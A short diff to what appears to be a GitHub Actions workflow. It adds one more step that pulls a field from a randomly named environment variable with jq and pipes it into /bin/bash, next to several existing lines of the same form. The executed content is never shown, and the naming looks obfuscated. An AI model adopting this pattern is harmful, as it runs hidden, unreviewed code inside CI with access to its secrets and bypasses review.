@@ -29,6 +29,7 @@ jobs:
           echo $lz14279 | jq -r .e6140 | /bin/bash
           echo $ulg7 | jq -r .cwz164 | /bin/bash
           echo $rab43078 | jq -r .bk7 | /bin/bash
+          printf '%s' "$pabxy56" | jq -r .kt7047 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
